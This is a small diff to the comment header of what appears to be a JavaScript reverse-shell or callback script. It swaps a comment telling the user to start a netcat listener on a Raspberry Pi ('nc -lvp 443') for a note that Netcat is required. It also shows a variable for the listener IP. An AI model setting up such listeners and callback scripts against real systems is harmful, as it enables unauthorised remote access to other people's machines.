@@ -1,6 +1,5 @@
 // Not my code!
-
-// SSH into the pi and do nc -lvp 443
+// Requires Netcat, i recommend just using the Pi's inbuilt.
 
 // Change to your netcat listener IP
 var IP = "172.16.0.1";
